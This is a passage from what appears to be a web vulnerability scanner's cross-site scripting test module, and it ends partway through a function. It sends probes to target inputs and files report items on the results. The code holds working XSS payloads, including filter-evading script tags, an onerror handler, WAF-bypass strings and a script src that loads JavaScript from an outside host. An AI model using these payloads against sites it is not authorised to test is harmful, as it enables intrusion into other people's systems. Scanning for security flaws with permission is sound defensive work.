#include helpers.inc;
#include reflection_helpers.inc;
#include debug_helpers.inc;
#include error_messages_helpers.inc;
var script_start_tag = "<ScRiPt >";
var script_end_tag = "</ScRiPt>";
var script_payload = randStr(4);
var debug = false;
var documentType_invalid = -1;
var documentType_html = 1;
var documentType_xml = 2;
var errorMessages = new classErrorMessages();
{ // class for testing XSS
	function classXSS(targetUrl, scheme, inputIndex, variationIndex, reflectionPoint){
		this.scheme = scheme;
		this.targetUrl = targetUrl;
		this.inputIndex = inputIndex;
		
        if (debug) trace("url " + targetUrl.path);
        if (debug) trace("testing input: " + scheme.getInputName(inputIndex));
        if (debug && reflectionPoint) trace("testing reflection on : " + reflectionPoint.url.url);
        	
        var inputType = scheme.getInputTypeStr(inputIndex);
		if (variationIndex != null) {
			this.variations = new TList();
			this.variations.add(variationIndex);
		}
		else this.variations = scheme.selectVariationsForInput(inputIndex);
		
		this.currentVariation = 0;
		this.foundVulnOnVariation = false;
		this.lastJob = null;
		this.reflectionPoint = reflectionPoint;
		this.founds = null;
        this.found = null;
        this.documentType = documentType_invalid;
        this.isXML = false;
        this.classXSSInURI = false;
        this.origValue = this.getOrigValue();
        this.origStatusCode = false;
        this.origValueSep = "_";
        this.foundUnicodeProblems = false;
        this.manualConfirmationRequired = false;
	}
	
    /**************************************************************************************************************/
    classXSS.prototype.getOrigValue = function()
    {   
        var value = "";
        
        if (!this.scheme) return value;
        
        if (this.variations)
            for (var i=0; i<this.variations.count; i++){
                var varValue = this.scheme.getVariation(this.variations.item(i)).item(this.inputIndex);
                
                // if the value is not yet set      
                if(value == "" && varValue != "") {
                    value = varValue;                       
                    break;
                }
            }
        
        // if empty, set something
        if (value == "" || value == "undefined") value = "1";
        
        return value;
    }
	
	/**************************************************************************************************************/
	classXSS.prototype.request = function(value, dontEncode, schemePath)
	{	
		this.scheme.loadVariation(this.variations.item(this.currentVariation));
		
		// for files manipulate also the input filename and set a valid content-type
		if (this.scheme.hasFileInput && (this.scheme.getInputFlags(this.inputIndex) & INPUT_FLAG_IS_FILE)){
			this.scheme.setInputFileName(this.inputIndex, value);
			this.scheme.setInputContentType(this.inputIndex, "image/png");			
			if (dontEncode) this.scheme.setEncodedInputValue(this.inputIndex, value);
	        else this.scheme.setInputValue(this.inputIndex, value);
		}		
		else 
		{		
	        if (dontEncode) this.scheme.setEncodedInputValue(this.inputIndex, value);
	        else this.scheme.setInputValue(this.inputIndex, value);
        }
		this.lastJob = new THTTPJob();
		this.lastJob.url = this.targetUrl;
		this.lastJob.autoRedirect = true;
		this.lastJob.restrictRedirectToSameHost = true;
		
		// should I set the scheme path?
		if (schemePath) {
			var origSchemePath = this.scheme.path;
			this.scheme.path = schemePath;
		}
		
		// populate request
		this.scheme.populateRequest(this.lastJob);
		if (schemePath) {
			// restore scheme path
			this.scheme.path = origSchemePath;
		}
        // populate referer tag - some sites may need it
        if (!this.lastJob.request.headerExists('Referer'))
            this.lastJob.request.addHeader('Referer', scanURL.url, false);
		this.lastJob.execute();
		var tmp = false;
		if (!this.lastJob.wasError && this.reflectionPoint) {
			// check for stored XSS (replace lastJob with the reflection test)			
			this.reflectionPoint.execute();
			this.lastJob.response.copyFrom(this.reflectionPoint.response);	
			tmp = this.reflectionPoint.wasError;		
		}
		return ((!this.lastJob.wasError || (this.lastJob.wasError && this.lastJob.errorCode == 0xF0003)) && !tmp); 
	}	
	/**************************************************************************************************************/
	classXSS.prototype.isVerified = function(testValue) {
		var returnValue = true;
        if (this.found) {
    		if (this.found.insideScript || this.found.insideTag) returnValue = false;
            else
    		    if (this.found.insideJavascript) returnValue = false
        }
        
        // for content-type xml don't mark them as verified
        if (this.documentType == documentType_xml || this.documentType == documentType_invalid)  returnValue = false;
        
        // this is also not very certain (don't mark it as verified)
        if (testValue.indexOf("img/src=") != -1) returnValue = false;
        
        // css style expressions are not verified
        if (testValue.indexOf("acu:Expre/**/SSion") != -1) returnValue = false;        
        
        // AngularJs is also not very certain (don't mark it as verified)
        if (testValue.indexOf("{{1==1}}") != -1) returnValue = false;
        // this is also not very certain (don't mark it as verified)
        if (testValue.indexOf("`<img\/src=x") != -1) returnValue = false;
        if (testValue.indexOf("[if]><script>") != -1) returnValue = false;
        // us encoding bug in ie6 and ie7
        if (testValue.indexOf("¼script¾alert(") != -1) returnValue = false;
        // WAF bypass payloads
        if (testValue.indexOf("[!+!]") != -1) returnValue = false;
        
        return returnValue;
    }
    
	/**************************************************************************************************************/
	classXSS.prototype.prepareDetailsString = function(value) {
		var details = "";
        
        if (debug) traceObject(this.found);
        
        if (this.found == null) return details;
        
        if (this.found.insideMetaRefresh)  details = details + "The input is reflected inside a META refresh parameter.[break]"; 
        if (this.found.insideFormActionAHref)  details = details + "The input is reflected inside A tag href parameter, a FORM tag action parameter or (I)FRAME src parameter.[break]"; 
		if (this.found.insideTextarea) details = details + "The input is reflected inside <textarea> tag.[break]"; 
        
		if (this.found.insideScript){
			if(this.found.insideScriptSingleQuote) details = details + "The input is reflected inside <script> tag between single quotes.[break]";
			else if(this.found.insideScriptDoubleQuote) details = details + "The input is reflected inside <script> tag between double quotes.[break]";
			else details = details + "The input is reflected inside <script> tag.[break]";  
		}
		if (this.found.insideJavascript){
			if(this.found.insideScriptSingleQuote) details = details + "The input is reflected inside Javascript code between single quotes.[break]";
			else if(this.found.insideScriptDoubleQuote) details = details + "The input is reflected inside Javascript code between double quotes.[break]";
			else details = details + "The input is reflected inside Javascript code.[break]";  
		}
		if (this.found.insideText) details = details + "The input is reflected inside a text element.[break]";  
		if (this.found.insideTag) details = details + "The input is reflected inside a tag parameter without quotes.[break]";  
		if (this.found.insideTagDoubleQuotes) details = details + "The input is reflected inside a tag parameter between double quotes.[break]";  
		if (this.found.insideTagSingleQuotes) details = details + "The input is reflected inside a tag parameter between single quotes.[break]";  
		if (this.found.insideComment) details = details + "The input is reflected inside a comment element.[break]";
		return details;
	}
	/**************************************************************************************************************/
	classXSS.prototype.alert = function(testValue, possibleXSS)
	{	
		this.foundVulnOnVariation = true;
		
		var ri = new TReportItem();
		ri.LoadFromFile("XSS.xml");
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/XSS";
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
	
		if (this.reflectionPoint) {
			ri.name = ri.name + ' [stored]';
			ri.details = ri.details + "[break]The input is reflected in [bold][dark]" + this.reflectionPoint.url.url + "[/dark][/bold]";
		}
		
		var extraDetails = this.prepareDetailsString(testValue);
		if (extraDetails) ri.details = ri.details + "[break]" + extraDetails;		
		
		// trace(this.scheme.path + ' => ' + ri.Details);
        // for us encoding bug that affects IE 6 and IE7 lower severity, write info
        if (testValue.indexOf("¼script¾alert(") != -1) {
            ri.severity = 'medium';
            ri.description = "[coolbox][dark]This type of XSS can only be triggered on Internet Explorer 6 and Internet Explorer 7.[/dark][/coolbox][break]" + ri.description;
            ri.name = ri.name + " (IE7)";
        }
        // for WAF bypass payloads
        if (testValue.indexOf("[!+!]") != -1) {
            ri.severity = 'medium';
        }
		// for content-sniffing vulns lower the severity
		if (this.documentType == documentType_invalid) {
			ri.severity = 'medium';
			ri.description = "[coolbox][dark]This type of XSS can only be triggered on (and affects) content sniffing browsers.[/dark][/coolbox][break]" + ri.description;
			ri.name = ri.name + " (content-sniffing)";
		}
		else {				
			// content-sniffing are not verified
	        if (this.isVerified(testValue))
	            ri.name = ri.name + " (verified)";
	        
	        if (this.manualConfirmationRequired) {
	        	ri.description = "[coolbox][dark]Manual confirmation is required for this alert.[/dark][/coolbox][break]" + ri.description;
                this.manualConfirmationRequired = false;
	        }
        }
		
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}
    	
	/**************************************************************************************************************/
	classXSS.prototype.alertUserCharset = function(testValue, extraDetails)
	{	
        var vxml = 'User_controllable_charset.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		
		if (extraDetails) ri.details = ri.details + "[break]" + extraDetails;
		
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}
	/**************************************************************************************************************/
	classXSS.prototype.alertAngularJSTemplateInjection = function(testValue, extraDetails)
	{
		var vxml = 'AngularJS_client_side_template_injection.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
        if (!this.scheme.path) ri.affects = "/"
        else ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]. The input was reflected inside an AngularJS template. ";
		if (extraDetails) ri.details = ri.details + "[break]" + extraDetails;
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);
	}
	/**************************************************************************************************************/
	classXSS.prototype.alertHTMLInjection = function(testValue, extraDetails)
	{	
        var vxml = 'HTML_Injection.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		
		if (extraDetails) {
			ri.details = ri.details + "[break]" + extraDetails;		
			if (extraDetails.indexOf("non-terminated parameter") != -1) {
				ri.name = "HTML injection with non-terminated parameter";
			}
		}
		
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}    	
    
	/**************************************************************************************************************/
	classXSS.prototype.alertBREACHattack = function(details)
	{	
        var vxml = 'BREACH_attack.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		
		ri.details = details;
		
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}     
	
	/**************************************************************************************************************/
	classXSS.prototype.alertUserScriptSrc = function(testValue, tagName)
	{	
        var vxml = 'User_controllable_script_source.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		if (tagName) {
			ri.details = ri.details + "[break]The tag [bold][dark]" + tagName + "[/dark][/bold] can be controlled.";
			if (tagName == 'script' || tagName == 'base') {
				ri.severity = 'high';
			}
			else {
				ri.severity = 'medium';
			}
		}
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}
	
	/**************************************************************************************************************/
	classXSS.prototype.alertUserControllableTag = function(testValue, tagName)
	{	
        var vxml = 'User_controllable_tag_source.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		if (tagName) {
			ri.details = ri.details + "[break]This is a special case. The tag parameter [bold][dark]" + tagName + "[/dark][/bold] can be controlled.";
		}
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}	
    	
	/**************************************************************************************************************/
	classXSS.prototype.alertUserPartialScriptSrc = function(testValue)
	{	
        var vxml = 'User_partial_controllable_script_source.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}    
			
	/**************************************************************************************************************/
	classXSS.prototype.alertUnicodeProblems = function(testValue, extraDetails)
	{	
        var vxml = 'Unicode_Transformation_Issues.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		
		if (extraDetails) ri.details = ri.details + "[break][break]List of issues:[break]" + extraDetails;
		
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}
    /**************************************************************************************************************/
    classXSS.prototype.alertTruncationProblems = function(vxml, testValue, extraDetails)
    {
        var ri = new TReportItem();
        ri.LoadFromFile(vxml);
        ri.affects = this.scheme.path;
        ri.alertPath = "Scripts/" + vxml;
        ri.parameter = this.scheme.getInputName(this.inputIndex);
        ri.parameterValue = testValue;
        ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
        if (extraDetails) ri.details = ri.details + "[break][break]" + extraDetails;
        ri.setHttpInfo(this.lastJob);
        AddReportItem(ri);
    }
    /**************************************************************************************************************/
	classXSS.prototype.alertFormatStringVuln = function(testValue, extraDetails)
	{	
        var vxml = 'Uncontrolled_Format_String.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold]";
		
		if (extraDetails) ri.details = ri.details + "[break]The input value was converted to [dark][bold]" + extraDetails + "[/bold][/dark]. [bold]%6x[/bold] was replaced with data from stack, this indicates a format string vulnerability.";
		
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}       		
	/**************************************************************************************************************/
	classXSS.prototype.alertJSONP = function(testValue)
	{
        var vxml = 'Cross_Domain_Data_Hijacking.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold][break]The value is reflected at the top of the page.";
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);
	}
    /**************************************************************************************************************/
    classXSS.prototype.alertServerSideTemplateInjection = function(testValue, expectedResult)
    {
        var vxml = 'Server_Side_Template_Injection.xml';
        var ri = new TReportItem();
        ri.LoadFromFile(vxml);
        ri.affects = this.scheme.path;
        ri.alertPath = "Scripts/" + vxml;
        ri.parameter = this.scheme.getInputName(this.inputIndex);
        ri.parameterValue = testValue;
        ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold][break]The response contained the result of the evaluated expression: [bold][dark]" + expectedResult + "[/dark][/bold]";
        ri.setHttpInfo(this.lastJob);
        AddReportItem(ri);
    }
    /**************************************************************************************************************/
    classXSS.prototype.alertSOME = function(testValue)
    {
        var vxml = 'Same_Origin_Method_Execution.xml';
        var ri = new TReportItem();
        ri.LoadFromFile(vxml);
        ri.affects = this.scheme.path;
        ri.alertPath = "Scripts/" + vxml;
        ri.parameter = this.scheme.getInputName(this.inputIndex);
        ri.parameterValue = testValue;
        ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold][break]The value is reflected inside a SCRIPT tag.";
        ri.setHttpInfo(this.lastJob);
        AddReportItem(ri);
    }
    /**************************************************************************************************************/
	classXSS.prototype.alertRFD = function(testValue, filePath)
	{	
        var vxml = 'Reflected_File_Download.xml';
		var ri = new TReportItem();
		ri.LoadFromFile(vxml);
		
		ri.affects = this.scheme.path;
		ri.alertPath = "Scripts/" + vxml;
		ri.parameter = this.scheme.getInputName(this.inputIndex);
		ri.parameterValue = testValue;
        
		ri.details = this.scheme.getInputTypeStr(this.inputIndex) + " input [bold][dark]" + this.scheme.getInputName(this.inputIndex) + "[/dark][/bold] was set to [bold][dark]" + testValue + "[/dark][/bold][break]The path was changed to [bold][dark]" + filePath + "[/dark][/bold].";
		ri.setHttpInfo(this.lastJob);
		AddReportItem(ri);	
	}
	    		
	/**************************************************************************************************************/
	classXSS.prototype.lookForUserControllableVulns = function(rndStr, response)
	{
        // look for user controllable charset
        // first, let's look in content-type        
        var ct = this.lastJob.response.headerValue('content-type')
        if (ct.indexOf(rndStr) != -1) {            
            var results = new RegExp('text/(html|xml)\\s*;\\s*charset\\s*=\\s*(' + rndStr + ')', 'i').exec(ct);
            if (results) {
                //trace('vulnerable!');
                this.alertUserCharset(rndStr, 'The charset was defined in the Content-Type header.');
            }
        }
        
        // next, let's look in the meta tags
        var results = new RegExp('<meta\\s*http-equiv\\s*=\\s*[\'"]content-type[\'"]\\s*content\\s*=["\']text/(html|xml)\\s*;\\s*charset\\s*=\\s*' + rndStr, 'i').exec(response.body);
        if (results) {
        	this.alertUserCharset(rndStr, 'The charset was defined in the meta tag.');
		}
		
		// html5
        var hq = new THTMLQuery(response.body);
		if (hq.executeHtmlQuery("tag=meta|charset=" + rndStr)) {			
			this.alertUserCharset(rndStr, 'The charset was defined in the meta tag.');
		}		
        
		// look for user controllable script src
        var hq = new THTMLQuery(response.body);
		if (hq.executeHtmlQuery("tag=script|src=" + rndStr)) {			
			this.alertUserScriptSrc(rndStr, 'script');
		}        
		
		// look for other tags as well
		if (hq.executeHtmlQuery("tag=base|href=" + rndStr)) {			
			this.alertUserScriptSrc(rndStr, 'base');
		}        
		if (hq.executeHtmlQuery("tag=iframe|src=" + rndStr)) {			
			this.alertUserScriptSrc(rndStr, 'iframe');
		}
		if (hq.executeHtmlQuery("tag=iframe|srcdoc=" + rndStr)) {
			this.alertUserScriptSrc(rndStr, 'iframe');
		}
		if (hq.executeHtmlQuery("tag=frame|src=" + rndStr)) {
			this.alertUserScriptSrc(rndStr, 'frame');
		} 		
		if (hq.executeHtmlQuery("tag=object|data=" + rndStr)) {			
			this.alertUserScriptSrc(rndStr, 'object');
		} 		
		if (hq.executeHtmlQuery("tag=embed|src=" + rndStr)) {			
			this.alertUserScriptSrc(rndStr, 'embed');
		} 
		if (hq.executeHtmlQuery("tag=button|formaction=" + rndStr)) {
			this.alertUserScriptSrc(rndStr, 'button[formaction]');
		}
		
		// link href
		if (hq.executeHtmlQuery("tag=link|href=" + rndStr)) {
			this.alertUserControllableTag(rndStr, 'link[href]');
		}
								
		// look for user partial controllable script src
        var hq = new THTMLQuery(response.body);
		if (hq.executeHtmlQuery("tag=script|src<" + rndStr)) {	
			this.testPartialUserControllableScriptSrc();	
		}
    }	
	
	/**************************************************************************************************************/
	classXSS.prototype.testReflection = function()
	{	
		var rndStr = this.origValue + this.origValueSep + (9000 + random(999)).toString();
		if (!this.request(rndStr)) return false;
        // save original status code for WAF testing
        this.origStatusCode = this.lastJob.responseStatus;
        this.founds = new Array();
        
    	// get content-type
    	var ct = this.lastJob.response.headerValue('content-type').toLowerCase();
        
        // detect content type
    	if (ct == '' || ct.indexOf('html') != -1)         
            this.documentType = documentType_html; 
        else                 
        if (ct.indexOf('xml') != -1)             
            this.documentType = documentType_xml;             
        else this.documentType = documentType_invalid; 
            
        // look for user controllable charset
        if (this.documentType != documentType_invalid)
        {
            if (rndStr.match(/^[\w\d\;]+$/))
                this.lookForUserControllableVulns(rndStr, this.lastJob.response);
        }
            
        // populate founds (list of places where the input is reflected)
        this.founds = SearchInputInResponse(rndStr, this.lastJob.response.body);
        
		return true;
	}
	
	/**************************************************************************************************************/
	classXSS.prototype.testPartialUserControllableScriptSrc = function()
	{	
		// add 2 characters that should be url-encoded to prevent this vuln
		var rndStr = this.origValue + this.origValueSep + (9000 + random(999)).toString() + '&#';
		if (!this.request(rndStr)) return false;
    	// get content-type
    	var ct = this.lastJob.response.headerValue('content-type').toLowerCase();
        
        // detect content type
    	if (ct == '' || ct.indexOf('html') != -1)         
            this.documentType = documentType_html; 
        else                 
        if (ct.indexOf('xml') != -1)             
            this.documentType = documentType_xml;             
        else this.documentType = documentType_invalid; 
            
        // look for partial user controllable script src
        if (this.documentType != documentType_invalid)
        {
	        var hq = new THTMLQuery(this.lastJob.response.body);
			if (hq.executeHtmlQuery("tag=script|src<" + rndStr)) {	
				this.alertUserPartialScriptSrc(rndStr);
			}
        }
        
		return true;
	}	
	
	/**************************************************************************************************************/
	/*	here are the tests 																						  */	
	/**************************************************************************************************************/
	classXSS.prototype.testSimpleScriptTagInjection = function(prefix)
	{
		// if returns false it will stop testing the current variation for the rest of tests		var rndStr = 9000 + random(999);			
        if (!prefix) prefix = this.origValue;
        else prefix = this.origValue + this.origValueSep + prefix;
        
		var inputValue = prefix + script_start_tag + script_payload + "(" + rndStr + ")" + script_end_tag;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload +' ("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }
        // WAF bypass
		var rndStr = 9000 + random(999);
		prefix = this.origValue;
		var tagName = "w" + randStr(5);
		tagName = tagName.toUpperCase();
		var startTagName = "<" + tagName + ">";
		var endTagName   = "</" + tagName + ">";
		var payload = randStr(5) + "[!+!]";
		payload = payload.toUpperCase();
		var inputValue = prefix + startTagName + payload + endTagName;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
		//don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
		if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
			var locationStr = this.lastJob.response.headerValue('location');
			if (locationStr) return true;
		}
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=" +  tagName+ "|textwithin=" + payload)
			|| hq.executeHtmlQuery("tag=" + tagName + "|textwithin=" + payload)
			|| hq.executeHtmlQuery('tag=' + tagName + '|textwithin=' + payload))
		{
			this.alert(inputValue);
			return false;
		}
		return true;
	}
    
	/**************************************************************************************************************/
	classXSS.prototype.testSimpleScriptTagInjectionWithoutEncoding = function(prefix)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			        
        if (!prefix) prefix = this.origValue;
        else prefix = this.origValue + this.origValueSep + prefix;
        
		var inputValue = prefix +  "<script>" + script_payload + "(" + rndStr + ")</script>";
		if (!this.request(inputValue, true)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }			
		return true;
	}    
    
	/**************************************************************************************************************/
	classXSS.prototype.testISINDEX = function(prefix)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        if (!prefix) prefix = this.origValue;
        else prefix = this.origValue + this.origValueSep + prefix;
        
		var inputValue = prefix + "<isindex type=image src=1 onerror=" + script_payload + "(" + rndStr + ")>";
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=isindex|onerror=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=isindex|onerror=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=isindex|onerror=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }			
		return true;
	}    
    
	/**************************************************************************************************************/
	classXSS.prototype.testScriptTagInjectionAgainstStringReplace = function(prefix)
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
        if (!prefix) prefix = this.origValue;
        else prefix = this.origValue + this.origValueSep + prefix;
        
		var inputValue = prefix + plain2UrlAll("<ScR<ScRiPt>IpT>" + script_payload + "(" + rndStr + ")" + "</sCr<ScRiPt>IpT>");
		//logError(inputValue);
		if (!this.request(inputValue, true)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }			
		return true;
	}
	
	/**************************************************************************************************************/
	classXSS.prototype.testScriptTagVariantInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<ScRiPt \r\n>" + script_payload + "(" + rndStr + ")" + script_end_tag;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "(" + rndStr + ")")
            || hq.executeHtmlQuery("tag=script|textwithin=" + script_payload + "('" + rndStr + "')")
            || hq.executeHtmlQuery('tag=script|textwithin=' + script_payload + '("' + rndStr + '")'))
            {			
			    this.alert(inputValue);	
			    return false;
		    }			
		return true;
	}	
	
	/**************************************************************************************************************/
	classXSS.prototype.testScriptTagSrcInjection = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
		var rndStr = 9000 + random(999);			
		var inputValue = this.origValue + "<ScRiPt/acu src=//testasp.vulnweb.com/t/xss.js?" + rndStr + ">" + script_end_tag;
		if (!this.request(inputValue)) {if (this.classXSSInURI) return true; else return false;}
        //don't report XSS vulns in HTML from redirects (the browser follows the redirects and doesn't execute the JS)
        if([301,302].indexOf(this.lastJob.responseStatus) != -1) {
            var locationStr = this.lastJob.response.headerValue('location');
            if (locationStr) return true;
        }
		var hq = new THTMLQuery(this.lastJob.response.body);
		if (hq.executeHtmlQuery("tag=script/acu|src=//testasp.vulnweb.com/t/xss.js?" + rndStr)) {			
			this.alert(inputValue);				
			return false;
		}		
		return true;
	}			
	
	/**************************************************************************************************************/
	classXSS.prototype.testUnvalidatedJSONP = function()
	{
		// if returns false it will stop testing the current variation for the rest of tests
